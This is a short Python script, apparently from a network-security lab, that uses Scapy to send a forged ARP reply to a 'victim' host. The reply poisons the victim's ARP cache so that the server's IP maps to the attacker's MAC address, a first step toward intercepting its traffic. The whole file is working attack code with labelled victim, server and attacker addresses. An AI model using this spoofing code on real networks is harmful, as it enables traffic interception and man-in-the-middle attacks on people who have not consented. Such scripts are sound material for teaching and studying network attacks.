from scapy.all import *

VICTIM_IP = "192.168.101.10"
SERVER_IP = "192.168.101.30"
ATTACKER_IP = "192.168.101.20"

ATTACKER_MAC = "02:42:c0:a8:65:14"
VICTIM_MAC = "02:42:c0:a8:65:0a"
SERVER_MAC = "02:42:c0:a8:65:1e"

broadcast = Ether(src=ATTACKER_MAC, dst=VICTIM_MAC)
arp = ARP(op=2, hwdst=VICTIM_MAC, psrc=SERVER_IP)
sendp (broadcast / arp, verbose=False)

